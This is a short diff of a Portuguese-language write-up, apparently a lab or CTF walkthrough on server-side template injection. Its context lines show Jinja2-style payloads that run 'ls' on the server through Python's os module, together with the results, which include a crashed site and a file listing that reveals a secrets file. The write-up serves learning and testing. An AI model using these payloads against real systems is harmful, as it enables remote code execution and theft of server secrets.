@@ -60,13 +60,13 @@ Sabendo qual engine está sendo usada, podemos testar alguns os payloads clássi
 * [4]`{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}`
 * [5]`{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}`
 
-[1]: Não tive nenhum retorno
+[1]: Não tive nenhum retorno.
 
 [2]: Acessou a classe base do Pyhton (object) e listou todas as subclasses que estão carregadas na memória do servidor no momento.
 
 <img width="1913" height="945" alt="image" src="https://github.com/user-attachments/assets/33368aac-ab2f-4baf-b195-3836b24b5c9f" />
 
-[3]: Deu erro e fez o site cair
+[3]: Deu erro e fez o site cair.
 
 [4] e [5]: Retornaram--> discloud.config main.py requirements.txt secrets777666 templates
 
